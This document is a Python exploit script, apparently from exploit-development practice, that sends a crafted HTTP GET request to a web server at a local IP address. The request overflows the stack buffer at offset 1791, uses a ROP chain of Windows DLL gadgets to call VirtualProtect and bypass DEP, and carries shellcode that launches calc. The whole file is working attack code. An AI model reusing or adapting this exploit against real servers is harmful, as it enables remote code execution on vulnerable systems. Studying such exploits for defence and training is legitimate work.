#!/usr/bin/python

import socket
import sys
import struct
import os


#eip offset 1791
crash = "A" * 1791
crash += struct.pack('<L', 0x6DE69FC1) #ret SHLWAPI.dll

rop = struct.pack('<L', 0x77bf5b62) # 0x77bf5b62: push esp ; pop ecx ; ret  ;  (1 found) RPCRT.DLL
rop += struct.pack('<L', 0x77e3e990) # 0x77e3e990: mov eax, ecx ; ret  ;  (1 found) KERNEL32.DLL
rop += struct.pack('<L', 0x6ff821d5) # 0x6ff821d5: add esp, 0x1C ; ret  ;  (1 found) MSVCRT.dll


parameters = struct.pack('<L',  0x77E22341)    # kernel32.VirtualProtect()
parameters += struct.pack('<L', 0x4c4c4c4c)    # return address (address of shellcode, or where to jump after VirtualProtect call. Not officially apart of the "parameters"
parameters += struct.pack('<L', 0x45454545)    # lpAddress
parameters += struct.pack('<L', 0x03030303)    # size of shellcode
parameters += struct.pack('<L', 0x54545454)    # flNewProtect
parameters += struct.pack('<L', 0x6FFF0120)    # pOldProtect (any writeable address)


rop2 = struct.pack('<L', 0x6f7e1704) #0x6f7e1704: inc ecx ; ret  ;  (1 found) COMCTL32.dll
rop2 += struct.pack('<L', 0x6f7e1704)
rop2 += struct.pack('<L', 0x6f7e1704)
rop2 += struct.pack('<L', 0x6f7e1704)
rop2 += struct.pack('<L', 0x6f7e1704)
rop2 += struct.pack('<L', 0x6f7e1704)
rop2 += struct.pack('<L', 0x6f7e1704)
rop2 += struct.pack('<L', 0x6f7e1704)
rop2 += struct.pack('<L', 0x6f7e1704)
rop2 += struct.pack('<L', 0x6f7e1704)
rop2 += struct.pack('<L', 0x6f7e1704)
rop2 += struct.pack('<L', 0x6f7e1704)

rop2 += struct.pack('<L', 0x77ef5b70) #0x77ef5b70: mov edx, ecx ; ret  ;  (1 found) - ntdll.dll
rop2 += struct.pack('<L', 0x73805ab6) #0x73805ab6: inc edx ; ret  ;  (1 found) - SHELL32.dll
rop2 += struct.pack('<L', 0x73805ab6)
rop2 += struct.pack('<L', 0x73805ab6)
rop2 += struct.pack('<L', 0x73805ab6)

rop2 += struct.pack('<L', 0x6ff7e29a) #0x6ff7e29a: add eax, 0x00000100 ; pop ebp ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x41414141) # padding for pop ebp
rop2 += struct.pack('<L', 0x6ff7e29a)
rop2 += struct.pack('<L', 0x41414141)

rop2 += struct.pack('<L', 0x738d9724) #0x738d9724: mov dword [ecx], eax ; pop esi ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x41414141)

rop2 += struct.pack('<L', 0x73b1e071) #0x73b1e071: mov dword [edx], eax ; ret  ;  (1 found)

rop2 += struct.pack('<L', 0x41aceade) #0x41aceade: xor eax, eax ; ret  ;  (1 found)

rop2 += struct.pack('<L', 0x6ff7e29a) # 0x6ff7e29a: add eax, 0x00000100 ; pop ebp ; ret --- x3
rop2 += struct.pack('<L', 0x41414141)
rop2 += struct.pack('<L', 0x6ff7e29a)
rop2 += struct.pack('<L', 0x41414141)
rop2 += struct.pack('<L', 0x6ff7e29a)
rop2 += struct.pack('<L', 0x41414141)

rop2 += struct.pack('<L', 0x73805ab6) #0x73805ab6: inc edx ; ret --- x4
rop2 += struct.pack('<L', 0x73805ab6)
rop2 += struct.pack('<L', 0x73805ab6)
rop2 += struct.pack('<L', 0x73805ab6)

rop2 += struct.pack('<L', 0x73b1e071) #0x73b1e071: mov dword [edx], eax ; ret --- x1

rop2 += struct.pack('<L', 0x41aceade) #xor eax, eax ; ret 

rop2 += struct.pack('<L', 0x77bd6cdc) #0x77bd6cdc: add eax, 0x02 ; ret  ;  (1 found
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc)
rop2 += struct.pack('<L', 0x77bd6cdc) # 2 * 32 = 0x40 (64)

rop2 += struct.pack('<L', 0x73805ab6) #0x73805ab6: inc edx ; ret --- x4
rop2 += struct.pack('<L', 0x73805ab6)
rop2 += struct.pack('<L', 0x73805ab6)
rop2 += struct.pack('<L', 0x73805ab6)

rop2 += struct.pack('<L', 0x73b1e071) #0x73b1e071: mov dword [edx], eax ; ret --- x1

rop2 += struct.pack('<L', 0x77e3e990) #77e3e990: mov eax, ecx ; ret  ;  (1 found)

rop2 += struct.pack('<L', 0x41ac80db) #0x41ac80db: dec eax ; dec eax ; ret  ;  (1 found)
rop2 += struct.pack('<L', 0x41ac80db)

rop2 += struct.pack('<L', 0x77ed5789) #0x77ed5789: xchg eax, esp ; ret  ;  (1 found)

#shellcode = "\x31\xc0\x50\x68"
#shellcode += "\x63\x61\x6c\x63"
#shellcode += "\x54\xbe\x77\xb1"
#shellcode += "\xfa\x6f\xff\xd6"

shellcode = "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"

get = "GET"
end = "HTTP/1.1\r\n\r\n"
#was 160 nops
nop2 = "\x90" * 200
nop = "\x90" * 4
filler = "\x43" * (5000-len(get)-len(end)-len(crash)-len(parameters)-len(nop)-len(rop))
#junk = "D" * 100

payload = crash + rop + parameters + nop + rop2 + nop2 + shellcode + filler + get + end

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.103', 80))
s.send(payload)
s.close()

print "Connection established..!"
